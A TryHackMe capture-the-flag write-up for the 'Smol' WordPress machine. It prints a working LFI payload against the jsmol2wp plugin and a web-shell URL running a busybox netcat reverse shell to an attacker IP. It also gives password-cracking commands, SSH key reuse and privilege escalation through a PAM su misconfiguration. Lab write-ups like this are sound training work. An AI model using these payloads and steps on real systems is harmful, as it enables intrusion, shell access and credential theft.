---
title: Smol(MEDIUM)|TryHackMe
date: 2025-11-04
categories:
  - Writeups
  - TryHackMe
tags:
  - thm
  - linux
  - wordpress
---

Everyone:You ready for this???

Me:


![letsgo](/assets/img/posts/2025-11-05-smol/ohyeah.mp4)



#### SUMMARY

This  wordpress machine has a vulnerable plugin with CVE ID # CVE-2018-20463.
This vulnerable plugin allows attackers to leverage an LFI to read server files arbitrarily.

#### **RECON**

Using wpscn
```
wpscan --url http://smol.thm --api-token <REDACTED>
```

It showed the vulnerable plugin with the cve ID attached , so I directly searched and got the exploit from 

https://github.com/sullo/advisory-archives/blob/master/wordpress-jsmol2wp-CVE-2018-20463-CVE-2018-20462.txt

Leveraging the LFI vulnerability , I could read the wp-config.php file.

Armed with the database credentials , I navigated to the `wp-admin` login page and logged in as the user.

From the post and pages , I noticed one unpublished page , so I checked it out and got this

![letsgo](/assets/img/posts/2025-11-05-smol/webmaster.png)


Searched online for Hello Dolly and from the github repo , seems like it had only one php file called `hello.php`.

Since Im to modify the source code , I have to find a way to get it. And that will be through LFI 
I used the payload after a number of try and errors 

```
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../hello.php
```

![letsgo](/assets/img/posts/2025-11-05-smol/hello.png)

From the source code that base64 encoded string there decodes as this
```
$_GET[“\143\155\x64”]
```

And the hex `\143\155\x64` decodes as `cmd`

meaning I landed a web shell.
with the help  of busybox, I was able to land a reverse shell with the command

Through the url
```
http://www.smol.thm/wp-admin/index.php?cmd=busybox nc 10.6.54.28 1337 -e /bin/bash
```

Rev shell payload
```
busybox nc 10.6.54.28 1337 -e /bin/bash
```


#### FOOTHOLD
Got a shell and now , quickly connected to the database through the mysql
![letsgo](/assets/img/posts/2025-11-05-smol/shell.png)
![letsgo](/assets/img/posts/2025-11-05-smol/database.png)

and retrieved data from `wp_users` 

![letsgo](/assets/img/posts/2025-11-05-smol/table.png)

Got all the hashes into one file and used john on them
```
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

```

I used the command below to check the cracked password
```
john hashes.txt --show 
```

Got the credentials of diego and switched user to diego 
```
su diego 
```


Since diego and think were in the same group and that group has read permissions on the thinks ssh idrsa , after switching user to diego , I read the idrsa file of think unto my local machine  and used that to ssh as think user

```
chmod 600 id_rsa
```

```
ssh -i id_rsa think@www.smol.thm
```

After further enum I realised I could simply su to  user gege  without requiring me to enter password. Understood that from the script below

```
What comes into your head when you find this 


think@ip-10-10-25-97:/etc/pam.d$ cat su 
#
# The PAM configuration file for the Shadow `su' service
#

# This allows root to su without passwords (normal operation)
auth       sufficient pam_rootok.so
auth  [success=ignore default=1] pam_succeed_if.so user = gege
auth  sufficient                 pam_succeed_if.so use_uid user = think
# Uncomment this to force users to be a member of group root
# before they can use `su'. You can also add "group=foo"
# to the end of this line if you want to use a group other
# than the default "root" (but this may have side effect of
# denying "root" user, unless she's a member of "foo" or explicitly
# permitted earlier by e.g. "sufficient pam_rootok.so").
# (Replaces the `SU_WHEEL_ONLY' option from login.defs)
# auth       required   pam_wheel.so

# Uncomment this if you want wheel members to be able to
# su without a password.
# auth       sufficient pam_wheel.so trust

# Uncomment this if you want members of a specific group to not
# be allowed to use su at all.
# auth       required   pam_wheel.so deny group=nosu

# Uncomment and edit /etc/security/time.conf if you need to set
# time restrainst on su usage.
# (Replaces the `PORTTIME_CHECKS_ENAB' option from login.defs
# as well as /etc/porttime)
# account    requisite  pam_time.so

# This module parses environment configuration file(s)
# and also allows you to use an extended config
# file /etc/security/pam_env.conf.
# 
# parsing /etc/environment needs "readenv=1"
session       required   pam_env.so readenv=1
# locale variables are also kept into /etc/default/locale in etch
# reading this file *in addition to /etc/environment* does not hurt
session       required   pam_env.so readenv=1 envfile=/etc/default/locale

# Defines the MAIL environment variable
# However, userdel also needs MAIL_DIR and MAIL_FILE variables
# in /etc/login.defs to make sure that removing a user 
# also removes the user's mail spool file.
# See comments in /etc/login.defs
#
# "nopen" stands to avoid reporting new mail when su'ing to another user
session    optional   pam_mail.so nopen

# Sets up user limits according to /etc/security/limits.conf
# (Replaces the use of /etc/limits in old login)
session    required   pam_limits.so

# The standard Unix authentication modules, used with
# NIS (man nsswitch) as well as normal /etc/passwd and
# /etc/shadow entries.
@include common-auth
@include common-account
@include common-session
```


So I su as gege
```
su gege
```

I found a `wordpress.old.zip` file in his home , I brought it to my local machine.
Was a password protected file soo I had to crack it.

I used the commands below
```
zip2john wordpress.old.zip > output.txt
```

Then I used john to crack the password
```
john output.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Got the password of the zip file, used that to unzip it
```
unzip wordpress.old.zip
enter the password:
```
Then I cat the wp-config.php file to get the credentials for user xavi who has the unrestricted privileges on the server.

![letsgo](/assets/img/posts/2025-11-05-smol/xavi.png)
So then I do 
```
sudo su
```
And that lands me the root shell!!!!!


I must say I loved the lateral movement.
